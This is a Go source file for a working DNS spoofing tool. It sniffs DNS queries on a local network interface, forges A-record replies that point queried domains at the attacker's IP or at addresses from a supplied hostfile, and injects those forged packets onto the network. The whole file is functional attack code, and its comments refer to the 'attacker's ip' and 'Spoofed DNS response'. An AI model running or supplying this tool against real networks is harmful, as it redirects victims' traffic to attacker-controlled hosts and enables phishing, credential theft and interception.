package main

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

var (
	bpfFilter     string = ""
	handle        *pcap.Handle
	interfaceName string        = ""
	snapshotLen   int32         = 1600
	timeout       time.Duration = pcap.BlockForever
	ethernetLayer layers.Ethernet
	ipv4Layer     layers.IPv4
	udpLayer      layers.UDP
	dnsLayer      layers.DNS
	dnsRecord     layers.DNSResourceRecord
	question      layers.DNSQuestion
	i             uint16
	ipv4Addr      net.IP
	udpPort       layers.UDPPort
	ethernetMAC   net.HardwareAddr
	fFlag         *string
	iFlag         *string
	ip            net.IP
	ipDomainMap   = make(map[string]string)
)

func main() {

	// -i flag is used to specify the network device interface
	iFlag = flag.String("i", "", "Interface to listen and inject packets")
	// -f flag is used to read a list of IP address and hostname pairs
	fFlag = flag.String("f", "", "Read a list of IP address and hostname pairs ")

	flag.Parse()

	// Storing the BPF string to be applied
	bpfFilter = strings.Join(flag.Args(), " ")

	if getInterfaceIP(*iFlag) == nil {
		errors.New("no interfaces available")
	}

	if *iFlag != "" {
		ip = getInterfaceIP(*iFlag)
		interfaceName = getInterfaceName()
	} else {
		ip = getDefaultIP()
		interfaceName = getDefaultInterface()
	}

	if *fFlag != "" {
		handleFile()
	}

	handle, error := pcap.OpenLive(interfaceName, snapshotLen, true, timeout)

	if error != nil {
		panic(error)
	}

	defer handle.Close()

	if bpfFilter != "" {
		// Setting the passed bpf filter
		err := handle.SetBPFFilter(bpfFilter)
		if err != nil {
			panic(err)
		}
	} else {
		// If bpf filter is not passed then excluding the attackers ip
		err := handle.SetBPFFilter("udp and dst port 53 and src host not " + ip.String())
		if err != nil {
			panic(err)
		}
	}

	handleDNSSpoof(handle)

}

/*
	Handling the hostfile detaiils
	Map of domain name and host ip to be sent in dns response is created if file is provided
 */
func handleFile() {
	file, err := os.Open(*fFlag)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		host := strings.Split(scanner.Text(), " ")
		ipHost := host[0]
		domain := host[1]

		ipDomainMap[domain] = ipHost

		fmt.Println(domain + " -> " + ipHost)
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func handleDNSSpoof(handle *pcap.Handle) {

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethernetLayer, &ipv4Layer, &udpLayer, &dnsLayer)
	parsedLayers := make([]gopacket.LayerType, 0, 4)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for {

		packet, err := packetSource.NextPacket()
		if err != nil {
			panic(err)
		}
		err = parser.DecodeLayers(packet.Data(), &parsedLayers)
		if err != nil {
			fmt.Println("Issue in decoding all the four layers!")
			continue
		}

		// Verify if all layers are decoded
		if len(parsedLayers) != 4 {
			fmt.Println("Total layers is not 4")
			continue
		}

		// Getting the dns responses
		outputBuffer := getDNSResponse()
		if outputBuffer == nil {
			continue
		}

		// Writing the packet contents
		err = handle.WritePacketData(outputBuffer.Bytes())
		if err != nil {
			panic(err)
		}
	}
}

func getDNSResponse() gopacket.SerializeBuffer {

	// Setting the fields of dnsRecord with TTL of 250 and A type
	dnsRecord.Class = layers.DNSClassIN
	dnsRecord.Type = layers.DNSTypeA
	dnsRecord.TTL = 250

	/// Skip if the packet is a response
	if dnsLayer.QR {
		return nil
	}

	/*
	Check if the hostfile is provided and set the spoofed response ip according to it
	Else set the attacker's ip to all responses
	*/
	for i = 0; i < dnsLayer.QDCount; i++ {
		fmt.Println(string(dnsLayer.Questions[i].Name))
		if *fFlag != "" {
			mapHostIP, isPresent := ipDomainMap[string(dnsLayer.Questions[i].Name)]
			if !isPresent {
				return nil
			} else {
				dnsRecord.IP = net.ParseIP(mapHostIP)
			}
		} else {
			dnsRecord.IP = ip
		}

	}

	// Since we are sending a response, QR is set to true
	dnsLayer.QR = true

	// If recursion was set then RA is set
	if dnsLayer.RD {
		dnsLayer.RA = true
	}

	// Get the question/base url
	question = dnsLayer.Questions[0]

	// Only handling A type records
	if question.Type != layers.DNSTypeA || question.Class != layers.DNSClassIN {
		return nil
	}

	// copy the name across to the response
	dnsRecord.Name = question.Name

	// append the answer to the original query packet
	dnsLayer.Answers = append(dnsLayer.Answers, dnsRecord)
	dnsLayer.ANCount = dnsLayer.ANCount + 1

	// Exchanging the UDP ports for Spoofed DNS response
	udpPort = udpLayer.SrcPort
	udpLayer.SrcPort = udpLayer.DstPort
	udpLayer.DstPort = udpPort

	// Exchanging the IPs for Spoofed DNS response
	ipv4Addr = ipv4Layer.SrcIP
	ipv4Layer.SrcIP = ipv4Layer.DstIP
	ipv4Layer.DstIP = ipv4Addr

	// Exchanging the MACs for Spoofed DNS response
	ethernetMAC = ethernetLayer.SrcMAC
	ethernetLayer.SrcMAC = ethernetLayer.DstMAC
	ethernetLayer.DstMAC = ethernetMAC


	// Calculate and set the checksum for UDP
	err := udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
	if err != nil {
		panic(err)
	}

	// Setting the serialization features
	serializeOptions := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// Creating a serializable buffer
	newSerializeBuffer := gopacket.NewSerializeBuffer()

	// Serializing the packet data and returning the same
	err = gopacket.SerializeLayers(newSerializeBuffer, serializeOptions, &ethernetLayer, &ipv4Layer, &udpLayer, &dnsLayer)
	if err != nil {
		panic(err)
	}

	return newSerializeBuffer

}

// Chek and return if the interface passed is available else return default interface
func getInterfaceName() string {
	interfaces, err := net.Interfaces()

	if err != nil {
		panic(err)
	}

	if len(interfaces) < 1 {
		errors.New("no interfaces available")
	}

	for i := range interfaces {

		if interfaces[i].Name != *iFlag {
			continue
		}

		return interfaces[i].Name
	}

	return getDefaultInterface()

}

// Returns eth0 or the first interface available
func getDefaultInterface() string {
	interfaces, err := net.Interfaces()

	if err != nil {
		panic(err)
	}

	if len(interfaces) < 1 {
		errors.New("no interfaces available")
	}

	for i := range interfaces {

		if interfaces[i].Name != "eth0" {
			continue
		}

		return interfaces[i].Name
	}

	return interfaces[0].Name

}


// Getting the default ip of available interface
func getDefaultIP() net.IP {

	interfaces, err := net.Interfaces()
	if err != nil {
		panic(err)
	}

	if len(interfaces) < 1 {
		return nil
	}

	for i := range interfaces {

		if interfaces[i].Name != "eth0" {
			continue
		}

		ipAddressList, err := interfaces[i].Addrs()

		if err != nil {
			panic(err)
		}

		// Verifying IP is present for the interface
		if len(ipAddressList) < 1 {
			panic("No IP Address for input interface")
		}

		ipAddr, _, ipErr := net.ParseCIDR(ipAddressList[0].String())
		if ipErr != nil {
			panic(ipErr)
		}
		return ipAddr

	}

	ipAddressList, err := interfaces[0].Addrs()

	if err != nil {
		panic(err)
	}

	// Verifying IP is present for the interface
	if len(ipAddressList) < 1 {
		panic("No IP Address for input interface")
	}

	ipAddr, _, ipErr := net.ParseCIDR(ipAddressList[0].String())
	if ipErr != nil {
		panic(ipErr)
	}

	return ipAddr
}

// Getting the IP of passed interface
func getInterfaceIP(interFace string) net.IP {
	interfaces, err := net.Interfaces()
	if err != nil {
		panic(err)
	}
	for i := range interfaces {

		if interfaces[i].Name != interFace {
			continue
		}

		ipAddressList, err := interfaces[i].Addrs()

		if err != nil {
			panic(err)
		}

		// Verifying IP is present for the interface
		if len(ipAddressList) < 1 {
			panic("No IP Address for input interface")
		}

		ipAddr, _, ipErr := net.ParseCIDR(ipAddressList[0].String())
		if ipErr != nil {
			panic(ipErr)
		}
		return ipAddr
	}
	return getDefaultIP()
}
